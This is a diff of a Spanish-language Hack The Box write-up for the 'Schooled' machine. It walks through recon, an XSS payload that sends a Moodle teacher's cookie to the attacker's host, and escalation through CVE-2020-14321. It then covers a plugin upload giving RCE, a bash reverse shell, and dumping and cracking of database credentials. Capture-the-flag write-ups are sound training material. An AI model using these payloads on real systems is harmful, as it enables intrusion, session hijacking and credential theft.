@@ -1,26 +1,32 @@
 10.10.10.234 - Schooled
 -----------------------
 
+![Schooled](https://user-images.githubusercontent.com/96772264/199314853-8956a5e9-117c-43ee-b25f-5430992faa5f.png)
+
+---------------------------
+
+# Part 1: Reconocimiento
+
 Puertos abiertos: 22(ssh), 80(http)
 
 ```console
 └─$ whatweb http://10.10.10.234
 http://10.10.10.234 [200 OK] Apache[2.4.46], Bootstrap, Email[#,admissions@schooled.htb], HTML5, HTTPServer[FreeBSD][Apache/2.4.46] PHP[7.4.15], Script, Title[Schooled - A new kind of educational institute]
 ```
+![schooled3](https://user-images.githubusercontent.com/96772264/199315154-dc9aa443-8f34-4934-a473-c70dfc214d26.PNG)
+
 La maquina por tanto se llama schooled.htb (modificar el /etc/hosts)
-
-# Web
-
 Hay una seccion de contacto, intento hacer un xss.
-La peticion es un /POST a contact.php
-Pero por el servidor de python no recibo ninguna peticion.
 
+![schooled1](https://user-images.githubusercontent.com/96772264/199315191-3ea5b481-708a-4152-9e3b-add5a4e8ff16.PNG)
+
+La peticion es un /POST a contact.php. Pero por el servidor de python no recibo ninguna peticion.
 Hay una serie de usuarios en la web, en vez de copiarlos a mano, tiramos de trucos de bash:
 ```console
 └─$ curl -s http://10.10.10.234/teachers.html | html2text | grep -P "\*\*\* .*?" | sort -u | tr -d "*" > users.txt
 # Quitamos algunas lineas como "Contact Details"
 ```
-
+Tambien algo de fuzzing para descubrir subdirectorios.
 ```console
 └─$ wfuzz -c --hc=404 -t 200  -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt http://10.10.10.234/FUZZ/
 000000536:   200        25 L     68 W       1048 Ch     "css"                                                
@@ -30,23 +36,27 @@ Hay una serie de usuarios en la web, en vez de copiarlos a mano, tiramos de truc
 └─$ gobuster vhost -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -t 200 -u http://schooled.htb
 Found: moodle.schooled.htb (Status: 200) [Size: 84]
 ```
-En el directorio /js está todo el codigo fuente, pero no hay nada interesante.
-Luego está el subdominio **moodle**.
 
+En el directorio /js está todo el codigo fuente, pero no hay nada interesante. Luego está el subdominio **moodle**.
 Me han pedido que me registre -> cucuxii : Cucuxii123@ : cucuxii@student.schooled.htb
 
-Una vez registrado hay una seccion donde puedes subir archivos pero no hay manera de acceder a ellos, simplemente
-lo guarda (intenté subir un cmd.php)
+![schooled2](https://user-images.githubusercontent.com/96772264/199315428-c289208c-aaf5-49b2-8acc-01005e96baf0.PNG)
 
-En el botón **Site-home** hay cursos disponibles para iniciar, Es de un tal Michael Fillips (uno de los usaurios
-que obtuvimos antes). Una vez nos metemos en ese curso, hay una seccion de anuncios
-
+Una vez registrado hay una seccion donde puedes subir archivos pero no hay manera de acceder a ellos, simplemente lo guarda (intenté subir un cmd.php)
+En el botón **Site-home** hay cursos disponibles para iniciar, Es de un tal Michael Fillips (uno de los usaurios que obtuvimos antes). Una vez nos metemos en ese
+curso, hay una seccion de anuncios:
 ```
 Este es un curso al que uno se puede apuntar por su cuenta, para todos los que quieran mis lecciones, que se hagan
 un perfil de MoodleNet.
 Los que no lo tengan serán borrados, YO ESTARÉ REVISANDO a todos los estudiantes
 ```
-Cuando tenemos a otra persona que va a revisar algo nuestro podemos pensar en ataques XSS (ejemplo robo de cookie)
+---------------------------
+
+# Part 2: Escalada a profesor con cookie hijacking
+
+Cuando tenemos a otra persona que va a revisar algo nuestro podemos pensar en ataques XSS (ejemplo robo de cookie):
+
+![schooled4](https://user-images.githubusercontent.com/96772264/199315830-cb9c5658-2bd3-46a7-b4a2-10c7fb140503.PNG)
 
 ```console
 └─$ sudo python3 -m http.server 80
@@ -58,15 +68,17 @@ Nuevo payload -> robo de cookie
 
 No recibimos nada, pero sabemos que este hombre se come todo el javascript que le mandemos
 ```js
-var req1 = new XMLHttpRequest();
-req1.open("GET", "http://10.10.14.6/?cookie=" + document.cookie, false);
-req1.send();
+var req1 = new XMLHttpRequest();  // Nueva peticion "req1"
+req1.open("GET", "http://10.10.14.6/?cookie=" + document.cookie, false);   // Que visite tu servidor y te mande la cookie con el parametro cookie
+req1.send();   // hacer la peticion 
 ```
 Nos salta esto:
 ```
 10.10.10.234 - - [01/Nov/2022 13:37:22] "GET /?cookie=MoodleSession=u2ocqtkbdqpr7sqg4rf0lq0of7 HTTP/1.1" 200 -
 ```
 Cambiamos nuestra cookie por la suya y ya estamos bajo su perfil.
+![schooled6](https://user-images.githubusercontent.com/96772264/199315923-35a89877-8936-4166-80e6-10c93f44345e.PNG)
+
 En el calendario no hay nada interesante y en archivos tampoco. Si miramos su perfil nos da el correo
 ```phillips_manuel@staff.schooled.htb``` El nuestro era simplemente: **student.schooled.htb**
 
@@ -74,41 +86,55 @@ Si ponemos esto en el */etc/hosts* y accedemos a ```http://staff.schooled.htb```
 **schooled.htb** original.
 
 No se que más hacer, en searchsploit hay muchas versiones del moodles, asi que hay que buscar su version.
-Si buscamos en google ```moodle RCE teacher``` leyendo resulta que en moodle hay que pasar de profesor a manager.
+Si buscamos en google ```moodle RCE teacher``` leyendo resulta que en moodle hay que pasar de profesor a manager. 
 ```moodle privilege escalation from teacher to manaher``` nos da a la vuln **CVE-2020-14321**, acabando en el 
 [exploit](https://github.com/HoangKien1020/CVE-2020-14321). Tiene un video de vimeo donde lo explica.
 
+---------------------------
+
+# Part 3: Escalada a manager
+
+Utilizamos todo el rato este [exploit](https://github.com/HoangKien1020/CVE-2020-14321)
+
 No sabemos quien es el manager, pero tenemos un listado de usaurios y la parte de ver usaurios:  
-```http://moodle.schooled.htb/moodle/user/profile.php?id=10``` -> cambiando el id podemos viajar entre usuarios
-El 1 correspondiente a 1 no nos lo deja ver. Se supone que es el del manager. Mirando todos los que hay la señora
-Lianne_Carter no aparece y en *schooled.htb/teachers.html*, dice que es manager asi que es está a quien hay que 
-secuestrarle la sesión.
-
-
+```http://moodle.schooled.htb/moodle/user/profile.php?id=10``` -> cambiando el id podemos viajar entre usuarios. El 1 correspondiente a 1 no nos lo deja ver.
+Se supone que es el del manager. En ```http://schooled.htb/teachers.html``` dice que es manager asi que es está a quien hay que secuestrarle la sesión.
 En el exploit mencionan la ruta ```/enrol/manual/ajax.php``` La ruta nos dice que fatla el parametro id.
 
-Ataque -> en el video hablan de en cursos, (en nuestro caso Matematicas) en la seccion de participantes, darle a
-Enroll user y escoger a Lianne, luego interceptar la peticion y cambiar estos parametros 
-userlist de 25 a 24 (el id de nuestro Michael) y en role to assign 1, de administrador. 
+En el video del repositorio hablan de en cursos, (en nuestro caso Matematicas) en la seccion de participantes, darle a **Enroll user** y escoger a Lianne, luego
+interceptar la peticion y cambiar estos parametros -> userlist de 25 a 24 (el id de nuestro Michael) y en role to assign 1, de administrador. 
+![schooled7](https://user-images.githubusercontent.com/96772264/199316599-ca0a6581-03d8-4eb3-9ee9-282f7f2cc6a2.PNG)
+![schooled8](https://user-images.githubusercontent.com/96772264/199316614-08f3426a-93b5-4f7f-9212-fa237f3a52be.PNG)
 
-Una vez hecho esto, la lista permanece intacta pero si añadimos otra vez a Lianne (sin cambiar nada) y nos 
-metemos en su perfil, desde la lista, nos saldrá la opción de registranos como ella.
+Una vez hecho esto, la lista permanece intacta pero si añadimos otra vez a Lianne (sin cambiar nada) y nos  metemos en su perfil, desde la lista, nos saldrá la 
+opción de registranos como ella.
 
-Este ataque se llama MASS ASIGNMENT ATTACK y se suele dar muchas veces en apis, cuando hay una peticion para 
-cambiar una cosa, puedes cambiar mas de las que estaba previsto.
-
+Este ataque se llama MASS ASIGNMENT ATTACK y se suele dar muchas veces en apis, cuando hay una peticion para cambiar una cosa, puedes cambiar mas de las que 
+estaba previsto.
 
 En la seccion de Administracion, en Plugins no podemos subir nada.
-En la pagina del exploit de antes había una seccion que hablaba de permisos (payload to full permissions).
-LO que hay que hacer es irse a Users -> Permissions -> define roles -> Manager -> edit 
-Ahi te salen todos los permisos, si le das a save changes interceptando la peticion y pones lo que sale en la web:
+
+![schooled10](https://user-images.githubusercontent.com/96772264/199316740-1f1ee0c9-6daf-4270-ae5b-29b6e2b36a9a.PNG)
+
+En la pagina del exploit de antes había una seccion que hablaba de permisos (payload to full permissions).  
+Lo que hay que hacer es irse a Users -> Permissions -> define roles -> Manager -> edit   
+Ahi te salen todos los permisos, si le das a **save changes** interceptando la peticion y pones lo que sale en la web:  
 ```&return=manage&resettype=none&shortname=manager&name=&description=&archetype=manager&contextlevel10=0&n...```
-manteniendo la sesskey, podras editar los plugins.
+manteniendo la sesskey, podras editar los plugins.  
+
+![schooled12](https://user-images.githubusercontent.com/96772264/199316890-c5531791-704c-482e-add2-d6b4bfcdd6bc.PNG)
+![schooled11](https://user-images.githubusercontent.com/96772264/199316809-ae59d9ca-b55f-4444-b81a-27d663505821.PNG)
 
 Te pide un zip, pero el repo del exploit también te lo da.
 Una vez subido, accedes a la ruta ```http://moodle.schooled.htb/moodle/blocks/rce/lang/en/block_rce.php?cmd=id```
+
+![schooled13](https://user-images.githubusercontent.com/96772264/199316996-965a9335-94b0-409e-a3a4-318b6cf49f35.PNG)
 Y pones el comando para la reverse shell con los & urlencodeados a %26
 ```bash -c 'bash -i >%26 /dev/tcp/10.10.14.6/443 0>%261'``` y netcat ```sudo nc -nlvp 443```
+
+---------------------------
+
+# Part 4: Accediendo al sisteam 
 
 Tenemos una consola, pero no nos deja crear una tty ni hay curl o wget para subir un script de reconocimiento.
 ```console
@@ -150,7 +176,6 @@ password	varchar(255)	NO
 [www@Schooled /home]$ mysql -umoodle -pPlaybookMaster2020 -e "use moodle; select username,password,email from mdl_user"
 admin	$2y$10$3D/gznFHdpV6PXt1cLPhX.ViTgs87DCE5KqphQhGYR5GFbcl4qTiW jamie@staff.schooled.htb
 ```
-
 Este hash se intenta romper con jhon, pero tarda una eternidad
 ```
 └─$ hashcat --example-hashes | grep "\$2a" -B 2
@@ -160,16 +185,18 @@ HASH: $2a$05$MBCzKhG1KhezLh.0LRa0Kuw12nLJtpHy6DIaU.JAnqJUDYspHC.Ou
 └─$ john hash -w=/usr/share/wordlists/rockyou.txt --format=bcrypt
 !QAZ2wsx	(admin)
 ```
+---------------------------
 
+# Part 5: Escalando a root
+
+Pero podemos hacer ssh -> ```ssh jamie@10.10.10.234````
 ```console
 jamie@Schooled:/home $ sudo -l 
     (ALL) NOPASSWD: /usr/sbin/pkg update
     (ALL) NOPASSWD: /usr/sbin/pkg install *
 ```
-
-En gfobins nos dicen que con un programa llamado fpm realicemos una serie de comandos, como aqui no está
-se hace en la maquina atacante (ya que generan un archivo que luego se puede subir a esta)
-
+En [gfobins](https://gtfobins.github.io/gtfobins/pkg/) nos dicen que con un programa llamado fpm realicemos una serie de comandos, como aqui no está se hace en la
+maquina atacante (ya que generan un archivo que luego se puede subir a esta)
 ```console
 └─$ sudo gem install fpm
 └─$ TF=$(mktemp -d)
